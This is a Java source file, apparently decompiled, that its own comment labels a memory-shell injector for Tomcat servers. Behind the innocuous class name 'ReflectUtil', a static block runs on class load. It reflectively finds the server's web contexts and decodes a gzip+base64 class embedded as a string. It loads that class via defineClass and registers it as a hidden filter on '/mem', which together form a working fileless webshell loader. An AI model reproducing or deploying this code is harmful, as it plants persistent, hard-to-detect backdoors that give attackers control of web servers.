//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.example.demo.Static;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;

/**
 * 内存马注入器
 */
public class ReflectUtil {
    public String getUrlPattern() {
        return "/mem";
    }

    public String getClassName() {
        return "xxx";
    }

    public String getBase64String() throws IOException {
        return new String("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");

    }

    public ReflectUtil() {
        try {
            List<Object> contexts = this.getContext();
            Iterator var2 = contexts.iterator();

            while(var2.hasNext()) {
                Object context = var2.next();
                System.out.println("Context: "+context);
                Object filter = this.getFilter(context);
                System.out.println("Filter: "+filter);
                this.addFilter(context, filter);
                if (filter!=null){
                    System.out.println("if filter:"+filter);
                    break;
                }
            }
        } catch (Exception var5) {
        }

    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList();
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));
        Object context = null;

        try {
            Thread[] var4 = threads;
            int var5 = threads.length;

            for(int var6 = 0; var6 < var5; ++var6) {
                Thread thread = var4[var6];
                if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
                    HashMap childrenMap = (HashMap)getFV(getFV(getFV(thread, "target"), "this$0"), "children");
                    Iterator var9 = childrenMap.keySet().iterator();

                    while(var9.hasNext()) {
                        Object key = var9.next();
                        HashMap children = (HashMap)getFV(childrenMap.get(key), "children");
                        Iterator var12 = children.keySet().iterator();

                        while(var12.hasNext()) {
                            Object key1 = var12.next();
                            context = children.get(key1);
                            if (context != null && context.getClass().getName().contains("StandardContext")) {
                                contexts.add(context);
                            }

                            if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                                contexts.add(context);
                            }
                        }
                    }
                } else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                    context = getFV(getFV(thread.getContextClassLoader(), "resources"), "context");
                    if (context != null && context.getClass().getName().contains("StandardContext")) {
                        contexts.add(context);
                    }

                    if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                        contexts.add(context);
                    }
                }
            }

            return contexts;
        } catch (Exception var14) {
            throw new RuntimeException(var14);
        }
    }

    private Object getFilter(Object context) {
        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        System.out.println("flag");
        try {
            filter = classLoader.loadClass(this.getClassName());
            System.out.println("getFilter: "+filter);
        } catch (Exception var9) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String()));
                // 不解压缩方案 有问题，原因未知
                //byte[] clazzByte = decodeBase64(this.getBase64String());
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
                System.out.println("createFilter: "+filter);
                var9.printStackTrace();
            } catch (Throwable var8) {
                var8.printStackTrace();  // 打印异常信息
            }
            //var9.printStackTrace();
        }

        return filter;
    }

    public String getFilterName(String className) {
        if (className.contains(".")) {
            int lastDotIndex = className.lastIndexOf(".");
            return className.substring(lastDotIndex + 1);
        } else {
            return className;
        }
    }

    public void addFilter(Object context, Object filter) throws InvocationTargetException, NoSuchMethodException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        ClassLoader catalinaLoader = this.getCatalinaLoader();
        String filterClassName = this.getClassName();
        String filterName = this.getFilterName(filterClassName);

        try {
            if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{filterName}) != null) {
                return;
            }
        } catch (Exception var16) {
        }

        Object filterDef;
        Object filterMap;
        try {
            filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
            filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
        } catch (Exception var15) {
            try {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
            } catch (Exception var14) {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef", true, catalinaLoader).newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap", true, catalinaLoader).newInstance();
            }
        }

        try {
            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});

            Constructor[] constructors;
            try {
                invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
            } catch (Exception var12) {
                invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig", true, catalinaLoader).getDeclaredConstructors();
            }

            try {
                invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            } catch (Exception var11) {
                invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            }

            constructors[0].setAccessible(true);
            Object filterConfig = constructors[0].newInstance(context, filterDef);
            Map filterConfigs = (Map)getFV(context, "filterConfigs");
            filterConfigs.put(filterName, filterConfig);
        } catch (Exception var13) {
            var13.printStackTrace();
        }

    }

    public ClassLoader getCatalinaLoader() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));
        ClassLoader catalinaLoader = null;

        for(int i = 0; i < threads.length; ++i) {
            if (threads[i].getName().contains("ContainerBackgroundProcessor")) {
                catalinaLoader = threads[i].getContextClassLoader();
                break;
            }
        }

        return catalinaLoader;
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str));
        } catch (Exception var4) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str));
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];

        int n;
        while((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }

        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();

        while(clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException var4) {
                clazz = clazz.getSuperclass();
            }
        }

        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(Object obj, String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = obj instanceof Class ? (Class)obj : obj.getClass();
        Method method = null;
        Class tempClass = clazz;

        while(method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    Method[] methods = tempClass.getDeclaredMethods();

                    for(int i = 0; i < methods.length; ++i) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException var11) {
                tempClass = tempClass.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            if (obj instanceof Class) {
                try {
                    return method.invoke((Object)null, param);
                } catch (IllegalAccessException var9) {
                    throw new RuntimeException(var9.getMessage());
                }
            } else {
                try {
                    return method.invoke(obj, param);
                } catch (IllegalAccessException var10) {
                    throw new RuntimeException(var10.getMessage());
                }
            }
        }
    }

    // 静态代码块
    static {
        new ReflectUtil();
    }
}
